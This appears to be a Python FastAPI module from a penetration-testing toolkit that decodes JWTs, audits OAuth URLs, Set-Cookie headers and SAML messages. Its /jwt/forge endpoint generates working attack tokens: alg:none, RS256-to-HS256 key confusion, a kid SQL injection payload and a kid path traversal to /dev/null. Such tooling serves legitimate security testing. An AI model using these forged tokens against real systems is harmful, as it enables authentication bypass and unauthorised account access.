"""
Auth & Session Tester — JWT analysis/forgery, OAuth audit, cookie inspection, SAML decode.

Endpoints:
  POST /auth/jwt/decode    — decode and inspect a JWT
  POST /auth/jwt/forge     — produce an attack token (alg:none, key-confusion, kid-injection)
  POST /auth/jwt/verify    — verify a token's signature
  POST /auth/oauth/audit   — audit an OAuth authorization URL
  POST /auth/session/analyze — audit Set-Cookie headers
  POST /auth/saml/decode   — base64+inflate a SAML message and inspect it
"""

import base64
import hashlib
import hmac
import json
import math
import re
import zlib
from urllib.parse import parse_qs, urlparse

import structlog
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

logger = structlog.get_logger()
router = APIRouter()

# ── JWT helpers ────────────────────────────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _jwt_split(token: str) -> tuple[dict, dict, str]:
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise HTTPException(400, "Not a valid JWT (expected 3 dot-separated parts)")
    try:
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception as e:
        raise HTTPException(400, f"JWT decode error: {e}")
    return header, payload, parts[2]


def _jwt_warnings(header: dict, payload: dict) -> list[str]:
    warnings = []
    alg = header.get("alg", "").upper()
    if alg == "NONE":
        warnings.append("CRITICAL: alg=none — token is unsigned and trusted by vulnerable servers")
    elif alg in ("HS256", "HS384", "HS512"):
        warnings.append(f"Algorithm {alg} — symmetric; if key is weak, brute-forceable")
        warnings.append("RS256→HS256 key confusion may apply if server also accepts HS algorithms")
    elif alg in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256"):
        warnings.append(f"Algorithm {alg} — asymmetric; check for key confusion and JWK injection via kid/jku/x5u")
    if "kid" in header:
        warnings.append(f"kid={header['kid']!r} — check for SQL injection or path traversal in kid value")
    if "jku" in header or "x5u" in header:
        warnings.append("jku/x5u header present — server may fetch keys from attacker-controlled URL")
    if "exp" in payload:
        import time
        exp = payload["exp"]
        if exp < time.time():
            warnings.append(f"Token is EXPIRED (exp={exp})")
        elif exp - time.time() > 86400 * 365:
            warnings.append("Token expires in > 1 year — unusually long lifetime")
    else:
        warnings.append("No exp claim — token never expires")
    return warnings


# ── Schemas ────────────────────────────────────────────────────────────────

class JWTInput(BaseModel):
    token: str


class JWTForgeRequest(BaseModel):
    token: str
    attack: str              # "none" | "hs256_confusion" | "kid_sqli" | "kid_traversal"
    secret: str = ""         # for hs256_confusion: the RSA public key (PEM) used as HMAC secret
    kid_payload: str = "' OR '1'='1"


class JWTVerifyRequest(BaseModel):
    token: str
    secret: str              # HMAC secret or RSA public key PEM
    algorithm: str = "HS256"


class OAuthAuditRequest(BaseModel):
    authorization_url: str


class SessionAnalyzeRequest(BaseModel):
    set_cookie_headers: list[str]   # one or more raw Set-Cookie header strings


class SAMLDecodeRequest(BaseModel):
    saml_message: str    # base64-encoded (SAMLRequest or SAMLResponse)
    is_response: bool = False


# ── JWT routes ─────────────────────────────────────────────────────────────

@router.post("/jwt/decode", summary="Decode and inspect a JWT")
async def jwt_decode(req: JWTInput):
    header, payload, sig = _jwt_split(req.token)
    import time
    exp = payload.get("exp")
    now = time.time()
    return {
        "header":   header,
        "payload":  payload,
        "signature": sig,
        "expired":  (exp is not None and exp < now),
        "warnings": _jwt_warnings(header, payload),
        "parts": {
            "header_b64":  req.token.split(".")[0],
            "payload_b64": req.token.split(".")[1],
        },
    }


@router.post("/jwt/forge", summary="Produce an attack JWT")
async def jwt_forge(req: JWTForgeRequest):
    header, payload, _ = _jwt_split(req.token)
    token_parts = req.token.strip().split(".")

    attack = req.attack.lower()

    if attack == "none":
        # Strip signature, set alg: none
        new_header = {**header, "alg": "none"}
        h64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        p64 = token_parts[1]
        forged = f"{h64}.{p64}."
        description = "alg:none attack — signature stripped. Vulnerable servers accept this as valid."

    elif attack == "hs256_confusion":
        # Sign with the RSA public key as an HMAC-SHA256 secret
        secret_bytes = req.secret.encode()
        new_header = {**header, "alg": "HS256"}
        h64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        p64 = token_parts[1]
        msg = f"{h64}.{p64}".encode()
        sig = hmac.new(secret_bytes, msg, hashlib.sha256).digest()
        forged = f"{h64}.{p64}.{_b64url_encode(sig)}"
        description = "RS256→HS256 key confusion — signed with RSA public key as HMAC secret. Vulnerable if server verifies HS256 with its own public key."

    elif attack == "kid_sqli":
        new_header = {**header, "kid": req.kid_payload}
        h64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        p64 = token_parts[1]
        # Sign with empty string (common with SQL NULL bypass)
        sig = hmac.new(b"", f"{h64}.{p64}".encode(), hashlib.sha256).digest()
        forged = f"{h64}.{p64}.{_b64url_encode(sig)}"
        description = f"kid SQL injection — kid set to {req.kid_payload!r}. If server uses kid in SQL query, HMAC key may become NULL/empty."

    elif attack == "kid_traversal":
        traversal = "../../../../dev/null"
        new_header = {**header, "kid": traversal}
        h64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        p64 = token_parts[1]
        sig = hmac.new(b"", f"{h64}.{p64}".encode(), hashlib.sha256).digest()
        forged = f"{h64}.{p64}.{_b64url_encode(sig)}"
        description = "kid path traversal — kid points to /dev/null (empty file). HMAC key becomes empty string."

    else:
        raise HTTPException(400, f"Unknown attack type: {req.attack!r}. Use: none, hs256_confusion, kid_sqli, kid_traversal")

    return {"forged_token": forged, "description": description, "attack": attack}


@router.post("/jwt/verify", summary="Verify a JWT signature")
async def jwt_verify(req: JWTVerifyRequest):
    try:
        import jwt as pyjwt
        decoded = pyjwt.decode(
            req.token,
            req.secret,
            algorithms=[req.algorithm],
            options={"verify_exp": True},
        )
        return {"valid": True, "payload": decoded}
    except Exception as e:
        return {"valid": False, "error": str(e)}


# ── OAuth audit ────────────────────────────────────────────────────────────

@router.post("/oauth/audit", summary="Audit an OAuth 2.0 authorization URL")
async def oauth_audit(req: OAuthAuditRequest):
    url = req.authorization_url.strip()
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
    except Exception as e:
        raise HTTPException(400, f"Invalid URL: {e}")

    def get(key: str) -> str | None:
        vals = params.get(key, [])
        return vals[0] if vals else None

    findings = []

    # State parameter
    state = get("state")
    if not state:
        findings.append({"check": "state parameter", "status": "FAIL", "detail": "Missing state parameter — authorization endpoint is vulnerable to CSRF"})
    else:
        findings.append({"check": "state parameter", "status": "PASS", "detail": f"state present: {state[:20]}{'…' if len(state) > 20 else ''}"})

    # PKCE
    code_challenge = get("code_challenge")
    if not code_challenge:
        findings.append({"check": "PKCE (code_challenge)", "status": "WARN", "detail": "No PKCE — recommended for public clients (SPAs, native apps)"})
    else:
        method = get("code_challenge_method") or "plain"
        findings.append({"check": "PKCE (code_challenge)", "status": "PASS", "detail": f"PKCE present, method={method}"})

    # Response type
    response_type = get("response_type") or ""
    if "token" in response_type and "code" not in response_type:
        findings.append({"check": "response_type", "status": "WARN", "detail": "Implicit flow (response_type=token) is deprecated — tokens exposed in URL fragment/history"})
    elif response_type == "code":
        findings.append({"check": "response_type", "status": "PASS", "detail": "Authorization code flow"})
    else:
        findings.append({"check": "response_type", "status": "INFO", "detail": f"response_type={response_type or '(not set)'}"})

    # redirect_uri
    redirect_uri = get("redirect_uri") or ""
    if not redirect_uri:
        findings.append({"check": "redirect_uri", "status": "WARN", "detail": "No redirect_uri specified — relies on server-side default, may be open redirect"})
    else:
        if "*" in redirect_uri or redirect_uri.endswith("/"):
            findings.append({"check": "redirect_uri", "status": "WARN", "detail": f"Potentially loose redirect_uri: {redirect_uri}"})
        else:
            findings.append({"check": "redirect_uri", "status": "INFO", "detail": f"redirect_uri: {redirect_uri}"})

    # Scope
    scope = get("scope") or ""
    dangerous_scopes = [s for s in scope.split() if s.lower() in ("openid", "profile", "email", "offline_access", "admin", "write")]
    if "offline_access" in scope.lower():
        findings.append({"check": "scope", "status": "WARN", "detail": "offline_access scope requested — grants refresh tokens for persistent access"})
    if dangerous_scopes:
        findings.append({"check": "scope", "status": "INFO", "detail": f"Scopes: {scope}"})

    # nonce (for OIDC)
    if "openid" in scope.lower():
        nonce = get("nonce")
        if not nonce:
            findings.append({"check": "nonce (OIDC)", "status": "WARN", "detail": "OIDC flow without nonce — ID token replay attacks possible"})
        else:
            findings.append({"check": "nonce (OIDC)", "status": "PASS", "detail": "nonce present"})

    return {"url": url, "params": {k: v[0] for k, v in params.items()}, "findings": findings}


# ── Session / cookie analysis ──────────────────────────────────────────────

def _parse_cookie(raw: str) -> dict:
    parts = [p.strip() for p in raw.split(";")]
    name_val = parts[0]
    name, _, value = name_val.partition("=")
    attrs = {}
    for part in parts[1:]:
        if "=" in part:
            k, _, v = part.partition("=")
            attrs[k.strip().lower()] = v.strip()
        else:
            attrs[part.strip().lower()] = True
    return {"name": name.strip(), "value": value.strip(), "attrs": attrs}


def _cookie_entropy(value: str) -> float:
    if not value:
        return 0.0
    freq = {}
    for c in value:
        freq[c] = freq.get(c, 0) + 1
    length = len(value)
    return -sum((f / length) * math.log2(f / length) for f in freq.values())


@router.post("/session/analyze", summary="Audit Set-Cookie headers for security attributes")
async def session_analyze(req: SessionAnalyzeRequest):
    results = []
    for raw in req.set_cookie_headers:
        cookie = _parse_cookie(raw)
        attrs  = cookie["attrs"]
        findings = []

        if "httponly" not in attrs:
            findings.append({"flag": "HttpOnly", "status": "FAIL", "detail": "Missing — cookie accessible via document.cookie (XSS risk)"})
        else:
            findings.append({"flag": "HttpOnly", "status": "PASS", "detail": "Set"})

        if "secure" not in attrs:
            findings.append({"flag": "Secure", "status": "FAIL", "detail": "Missing — cookie sent over plain HTTP"})
        else:
            findings.append({"flag": "Secure", "status": "PASS", "detail": "Set"})

        samesite = attrs.get("samesite", "").lower()
        if not samesite:
            findings.append({"flag": "SameSite", "status": "FAIL", "detail": "Missing — CSRF risk (defaults to Lax in modern browsers, None in older)"})
        elif samesite == "none":
            findings.append({"flag": "SameSite", "status": "WARN", "detail": "SameSite=None — cookie sent cross-site; requires Secure flag"})
        else:
            findings.append({"flag": "SameSite", "status": "PASS", "detail": f"SameSite={samesite.capitalize()}"})

        name = cookie["name"]
        if name.startswith("__Host-"):
            findings.append({"flag": "Prefix (__Host-)", "status": "PASS", "detail": "Strongest prefix — locked to current host, path=/, requires Secure"})
        elif name.startswith("__Secure-"):
            findings.append({"flag": "Prefix (__Secure-)", "status": "PASS", "detail": "Secure prefix — requires Secure flag"})
        else:
            findings.append({"flag": "Cookie prefix", "status": "INFO", "detail": "No __Host- or __Secure- prefix — prefix hardening not applied"})

        max_age = attrs.get("max-age")
        expires = attrs.get("expires")
        if not max_age and not expires:
            findings.append({"flag": "Lifetime", "status": "INFO", "detail": "Session cookie (no Max-Age / Expires)"})
        else:
            val = max_age or expires
            findings.append({"flag": "Lifetime", "status": "INFO", "detail": f"Persistent: {val}"})

        entropy = _cookie_entropy(cookie["value"])
        if entropy < 3.5 and len(cookie["value"]) > 0:
            findings.append({"flag": "Entropy", "status": "WARN", "detail": f"Low entropy ({entropy:.2f} bits/char) — session ID may be predictable"})
        else:
            findings.append({"flag": "Entropy", "status": "PASS", "detail": f"Entropy {entropy:.2f} bits/char, length {len(cookie['value'])}"})

        results.append({"name": cookie["name"], "value": cookie["value"][:20] + ("…" if len(cookie["value"]) > 20 else ""), "attrs": attrs, "findings": findings})

    return {"cookies": results}


# ── SAML decoder ───────────────────────────────────────────────────────────

@router.post("/saml/decode", summary="Decode and inspect a SAML request or response")
async def saml_decode(req: SAMLDecodeRequest):
    raw = req.saml_message.strip()
    # Try URL-decode first
    try:
        from urllib.parse import unquote
        raw = unquote(raw)
    except Exception:
        pass

    # Base64 decode
    try:
        decoded_bytes = base64.b64decode(raw + "==")
    except Exception as e:
        raise HTTPException(400, f"Base64 decode failed: {e}")

    # Try inflate (SAMLRequest is deflate-compressed; SAMLResponse may not be)
    xml_bytes = decoded_bytes
    try:
        xml_bytes = zlib.decompress(decoded_bytes, -15)
    except zlib.error:
        xml_bytes = decoded_bytes

    try:
        xml_str = xml_bytes.decode("utf-8")
    except UnicodeDecodeError:
        xml_str = xml_bytes.decode("latin-1")

    # Inspect signature
    findings = []
    if "<ds:Signature" in xml_str or "<Signature" in xml_str:
        findings.append({"check": "Signature", "status": "INFO", "detail": "Signature element present — verify with issuer's public key"})
    else:
        findings.append({"check": "Signature", "status": "WARN", "detail": "No <Signature> element — assertion may be unsigned"})

    if 'NameIDFormat' in xml_str:
        match = re.search(r'Format=["\']([^"\']+)["\']', xml_str)
        if match:
            findings.append({"check": "NameID Format", "status": "INFO", "detail": match.group(1)})

    if 'NotOnOrAfter' in xml_str:
        match = re.search(r'NotOnOrAfter=["\']([^"\']+)["\']', xml_str)
        if match:
            findings.append({"check": "Expiry (NotOnOrAfter)", "status": "INFO", "detail": match.group(1)})
    else:
        findings.append({"check": "Expiry", "status": "WARN", "detail": "No NotOnOrAfter condition — replay attacks possible"})

    if 'InResponseTo' not in xml_str and req.is_response:
        findings.append({"check": "InResponseTo", "status": "WARN", "detail": "No InResponseTo attribute — IdP-initiated SSO or missing binding check"})

    return {"xml": xml_str, "findings": findings, "length": len(xml_str)}
